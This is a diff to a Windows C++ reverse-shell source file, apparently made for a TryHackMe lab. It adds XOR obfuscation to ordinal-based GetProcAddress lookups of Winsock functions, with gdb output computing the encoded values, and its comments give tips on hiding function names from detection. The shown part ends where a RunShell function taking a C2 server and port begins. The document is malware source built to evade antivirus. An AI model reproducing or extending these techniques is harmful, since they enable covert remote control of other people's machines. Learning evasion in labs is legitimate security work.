@@ -4,11 +4,32 @@
 #include <stdio.h>
 #include <winuser.h>
 #define DEFAULT_BUFLEN 1024
+#define XORKEY 99
 // For now this works, but you can also change the names of the types, and make sure that each typecast and declared type is also changed
 // You also might want to obfuscate the GetProcAddress(handle, string) to a code-split-merge method by array
 // Also the THM challenge is wrong, it compiles in C++ not C.
 //x86_64-w64-mingw32-g++ -lwsock32 -lws2_32 revshell.cpp
+/*
+ * Type "apropos word" to search for commands related to "word".
+(gdb) p/x 0x1073^99
+$1 = 0x1010
+(gdb) p/x 0x1078^99
+$2 = 0x101b
+(gdb) p/x 0x100b^99
+$3 = 0x1068
+(gdb) p/x 0x1009^99
+$4 = 0x106a
+(gdb) p/x 0x102f^99
+$5 = 0x104c
+(gdb) p/x 0x1003^99
+$6 = 0x1060
+(gdb) p/x 0x1074^99
+$7 = 0x1017
+(gdb)
+
+ * */
 int deobfuscate(int x) {
+    x ^= XORKEY;
     for (int i = 0; i < 4096; i++) {
         x -= 0x1;
     }
@@ -26,36 +47,36 @@ typedef int(WSAAPI* WSACLEANUP)(void);
 HMODULE dcffaf = LoadLibraryW(L"ws2_32");
 // ordinal 0x73
 //WSASTARTUP putratSASWym = (WSASTARTUP) GetProcAddress(dcffaf, "WSAStartup");
-WSASTARTUP putratSASWym = (WSASTARTUP) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x1073)));
+WSASTARTUP putratSASWym = (WSASTARTUP) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x1010)));
 // ordinal 0x78
 //WSASOCKETA AtekcoSASWym = (WSASOCKETA) GetProcAddress(dcffaf, "WSASocketA");
 //WSASOCKETA AtekcoSASWym = (WSASOCKETA) GetProcAddress(dcffaf, MAKEINTRESOURCE(0x78));
-WSASOCKETA AtekcoSASWym = (WSASOCKETA) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x1078)));
+WSASOCKETA AtekcoSASWym = (WSASOCKETA) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x101b)));
 
 // ordinal 0xb
 //INET_ADDR rdda_teniym = (INET_ADDR) GetProcAddress(dcffaf, "inet_addr");
 //INET_ADDR rdda_teniym = (INET_ADDR) GetProcAddress(dcffaf, MAKEINTRESOURCE(0xb));
-INET_ADDR rdda_teniym = (INET_ADDR) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x100b)));
+INET_ADDR rdda_teniym = (INET_ADDR) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x1068)));
 
 // ordinal 0x9
 //HTONS snothym = (HTONS) GetProcAddress(dcffaf, "htons");
 //HTONS snothym = (HTONS) GetProcAddress(dcffaf, MAKEINTRESOURCE(0x9));
-HTONS snothym = (HTONS) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x1009)));
+HTONS snothym = (HTONS) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x106a)));
 
 // ordinal 0x2f
 //WSACONNECT tcennoCASWym = (WSACONNECT) GetProcAddress(dcffaf, "WSAConnect");
 //WSACONNECT tcennoCASWym = (WSACONNECT) GetProcAddress(dcffaf, MAKEINTRESOURCE(0x2f));
-WSACONNECT tcennoCASWym = (WSACONNECT) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x102f)));
+WSACONNECT tcennoCASWym = (WSACONNECT) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x104c)));
 
 // ordinal 0x3
 //CLOSESOCKET tekcosesolcym = (CLOSESOCKET) GetProcAddress(dcffaf, "closesocket");
 //CLOSESOCKET tekcosesolcym = (CLOSESOCKET) GetProcAddress(dcffaf, MAKEINTRESOURCE(0x3));
-CLOSESOCKET tekcosesolcym = (CLOSESOCKET) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x1003)));
+CLOSESOCKET tekcosesolcym = (CLOSESOCKET) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x1060)));
 
 // ordinal 0x74
 //WSACLEANUP punaelCASWym = (WSACLEANUP) GetProcAddress(dcffaf, "WSACleanup");
 //WSACLEANUP punaelCASWym = (WSACLEANUP) GetProcAddress(dcffaf, MAKEINTRESOURCE(0x74));
-WSACLEANUP punaelCASWym = (WSACLEANUP) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x1074)));
+WSACLEANUP punaelCASWym = (WSACLEANUP) GetProcAddress(dcffaf, MAKEINTRESOURCE(deobfuscate(0x1017)));
 
 
 void RunShell(char* C2Server, int C2Port) {
